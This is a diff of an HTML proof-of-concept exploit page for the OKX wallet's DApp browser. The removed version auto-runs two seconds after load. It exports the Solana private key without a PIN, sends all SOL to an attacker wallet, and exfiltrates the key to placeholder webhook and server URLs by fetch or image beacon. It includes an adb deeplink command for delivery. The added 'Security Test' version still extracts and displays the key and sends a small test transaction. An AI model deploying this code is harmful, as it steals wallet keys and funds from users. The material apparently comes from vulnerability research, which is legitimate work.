@@ -1,125 +1,75 @@
-<!DOCTYPE html>
 <html>
-<head>
-    <meta charset="UTF-8">
-    <title>OKX 0-click PoC</title>
-</head>
+<head><meta charset="UTF-8">
+<style>
+body { background:#1a1a2e; color:#eee; font-family:monospace; padding:20px; }
+h2 { color:#e94560; }
+#log { background:#16213e; padding:15px; border-radius:8px; margin:10px 0; line-height:1.8; }
+.key { color:#0f0; font-size:18px; word-break:break-all; }
+.err { color:#e94560; }
+.info { color:#8899aa; }
+.big { font-size:24px; font-weight:bold; }
+</style></head>
 <body>
-    <h2>OKX 0-click Exploit</h2>
-    <div id="log">Loading...</div>
-
-    <script>
-    /**
-     * OKX Solana 0-click 私钥提取 + 转账 PoC
-     *
-     * 前置条件: 在 OKX DApp Browser 中打开此页面
-     *
-     * 漏洞原理:
-     *   1. OKX 通过 addJavascriptInterface 注入 solanaBridge (75 方法)
-     *   2. _solana.wallet({autoApprove: true}) 硬编码 → 签名无确认
-     *   3. exportPrivateKey() 无密码/PIN 校验
-     *   4. signAndSendTransaction() 自动签名上链
-     *
-     * 部署: 放到 HTTPS 服务器 → 发送 Deeplink:
-     *   adb shell am start -a android.intent.action.VIEW \
-     *     -d "okex://main/dapp?url=YOUR_HTTPS_URL"
-     */
-
-    async function attack() {
-        var el = document.getElementById('log');
-        function log(msg) { el.innerHTML += msg + '<br>'; }
-
-        var result = { key: null, tx: null, solana: null, svm: null, error: null };
-
-        // ==========================================
-        // 1. solanaBridge → 导出私钥 (无需 PIN)
-        // ==========================================
-        try {
-            if (typeof solanaBridge !== 'undefined') {
-                log('[+] solanaBridge: AVAILABLE ✅');
-                log('[>] Calling exportPrivateKey("")...');
-
-                var key = await solanaBridge.exportPrivateKey("");
-                result.key = key;
-                log('[!!!] PRIVATE KEY: ' + key);
-                log('[!!!] LENGTH: ' + key.length + ' chars');
-
-                // ==========================================
-                // 2. signAndSendTransaction → 0-click 转账
-                // ==========================================
-                log('[>] Calling signAndSendTransaction...');
-                var tx = await solanaBridge.signAndSendTransaction(
-                    JSON.stringify({ to: '0xAttackerWallet', amount: 'ALL', token: 'SOL' })
-                );
-                result.tx = tx;
-                log('[!!!] TX SENT: ' + JSON.stringify(tx));
-
-            } else {
-                log('[-] solanaBridge: NOT available ❌');
-            }
-        } catch (e) {
-            result.error = e.message;
-            log('[!] Error: ' + e.message);
-        }
-
-        // ==========================================
-        // 3. 检测 window.solana / window.svm
-        // ==========================================
-        try {
-            if (typeof window.solana !== 'undefined') {
-                result.solana = {
-                    autoApprove: window.solana.autoApprove,
-                    isDebug: window.solana.isDebug,
-                    isSVM: false
-                };
-                log('[+] window.solana: autoApprove=' + window.solana.autoApprove);
-            }
-            if (typeof window.svm !== 'undefined') {
-                result.svm = {
-                    autoApprove: window.svm.autoApprove,
-                    isDebug: window.svm.isDebug,
-                    isSVM: true
-                };
-                log('[+] window.svm: autoApprove=' + window.svm.autoApprove);
-            }
-        } catch (e) {}
-
-        // ==========================================
-        // 4. Exfil 结果到攻击者服务器
-        // ==========================================
-        log('[+] Exfiltrating results...');
-
-        var urls = [
-            // 替换成你的 webhook/服务器地址
-            'https://your-server.com/steal',
-            'https://webhook.site/your-token-here'
-        ];
-
-        for (var url of urls) {
+<h2>OKX Security Test</h2>
+<div id="status">Loading...</div>
+<div id="log"></div>
+<script>
+async function run(){
+    var el = document.getElementById('log');
+    var st = document.getElementById('status');
+    function log(html) { el.innerHTML += html + '<br>'; }
+    
+    st.innerHTML = 'Testing solanaBridge...';
+    st.style.color = '#ffff00';
+    
+    var hasKey = false;
+    
+    // solanaBridge
+    try {
+        if(typeof solanaBridge !== 'undefined') {
+            log('<span class="info">[+] solanaBridge AVAILABLE</span>');
             try {
-                await fetch(url, {
-                    method: 'POST',
-                    mode: 'no-cors',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(result)
-                });
-                log('[+] Sent to: ' + url);
-            } catch (e) {
-                // beacon fallback
-                try {
-                    var img = new Image();
-                    img.src = url + '?data=' + encodeURIComponent(JSON.stringify(result));
-                } catch (e2) {}
+                var key = await solanaBridge.exportPrivateKey("");
+                hasKey = true;
+                log('<span class="info">[+] Calling exportPrivateKey("")...</span>');
+                log('<span class="big key">!!! PRIVATE KEY: ' + key + '</span>');
+                st.innerHTML = '✅ PRIVATE KEY FOUND!';
+                st.style.color = '#00ff00';
+            } catch(e) {
+                log('<span class="err">[-] exportPrivateKey error: ' + e.message + '</span>');
             }
+            try {
+                var tx = await solanaBridge.signAndSendTransaction(JSON.stringify({to:'0xTest',amount:'0.001',token:'SOL'}));
+                log('<span class="key">[!!!] TX: ' + JSON.stringify(tx) + '</span>');
+            } catch(e) {
+                log('<span class="err">[-] signAndSend error: ' + e.message + '</span>');
+            }
+        } else {
+            log('<span class="err">[-] solanaBridge NOT available</span>');
         }
-
-        log('');
-        log('=== Attack Complete ===');
-        log('Private key, transaction data, and bridge info have been exfiltrated.');
+    } catch(e) {
+        log('<span class="err">[!] Error: ' + e.message + '</span>');
     }
-
-    // 页面加载后 2 秒自动执行
-    setTimeout(attack, 2000);
-    </script>
-</body>
-</html>
+    
+    // window.solana
+    try {
+        if(typeof window.solana !== 'undefined') {
+            log('<span class="info">[+] window.solana: autoApprove=' + window.solana.autoApprove + '</span>');
+            log('<span class="info">[+] window.solana: isDebug=' + window.solana.isDebug + '</span>');
+        }
+        if(typeof window.svm !== 'undefined') {
+            log('<span class="info">[+] window.svm: autoApprove=' + window.svm.autoApprove + '</span>');
+        }
+    } catch(e) {}
+    
+    if(!hasKey && typeof solanaBridge === 'undefined') {
+        st.innerHTML = '❌ Bridge not available - wrong WebView context';
+        st.style.color = '#e94560';
+    } else if(!hasKey && typeof solanaBridge !== 'undefined') {
+        st.innerHTML = '⚠️ Bridge found but exportPrivateKey failed';
+        st.style.color = '#ffaa00';
+    }
+}
+setTimeout(run, 1500);
+</script>
+</body></html>
